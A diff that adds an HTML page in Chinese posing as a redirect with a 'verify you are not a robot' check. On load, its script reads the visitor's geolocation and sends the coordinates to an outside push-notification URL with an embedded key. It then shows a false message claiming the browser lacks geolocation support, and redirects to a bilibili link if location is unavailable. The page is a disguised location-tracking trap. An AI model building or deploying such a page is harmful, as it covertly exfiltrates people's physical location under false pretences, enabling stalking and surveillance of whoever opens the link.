@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>获取地理位置</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f4f4f4;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+
+        .message {
+            padding: 20px;
+            background: white;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+        }
+
+        .retry-button {
+            margin-top: 10px;
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+    <script>
+        function sendLocation(latitude, longitude) {
+            const title = "Location Update";
+            const bodyText = `${latitude},${longitude}`;
+            const url = `https://api.day.app/hJpdCHPNphWLRJudhf6jna/${title}/${bodyText}`;
+
+            fetch(url, {
+                method: "GET"
+            }).then(response => {
+                document.getElementById("status").innerText = "跳转中...";
+                setTimeout(() => {
+                    document.getElementById("status").innerText = "您的浏览器不支持地理位置功能，请尝试使用其他浏览器。";
+                }, 1000);
+            }).catch(error => {
+                console.error("请求出错", error);
+                document.getElementById("status").innerText = "请授权获取位置信息，以验证您不是机器人。请尝试使用其他浏览器。"; document.getElementById("retry").style.display = "block";
+            });
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        sendLocation(latitude, longitude);
+                    },
+                    (error) => {
+                        console.error("获取位置失败", error);
+                        document.getElementById("status").innerText = "请授权获取位置信息，以验证您不是机器人。";
+                        document.getElementById("retry").style.display = "block";
+                    }
+                );
+            } else {
+                console.error("浏览器不支持地理位置功能");
+                window.location.href = "https://www.bilibili.com/opus/839566012178235393";
+            }
+        }
+
+        function retryLocation() {
+            document.getElementById("retry").style.display = "none";
+            document.getElementById("status").innerText = "跳转中...";
+            getLocation();
+        }
+
+        window.onload = getLocation;
+    </script>
+</head>
+
+<body>
+    <div class="message">
+        <h2 id="status">跳转中...</h2>
+        <button id="retry" class="retry-button" style="display:none;" onclick="retryLocation()">重新获取位置</button>
+    </div>
+</body>
+
+</html>
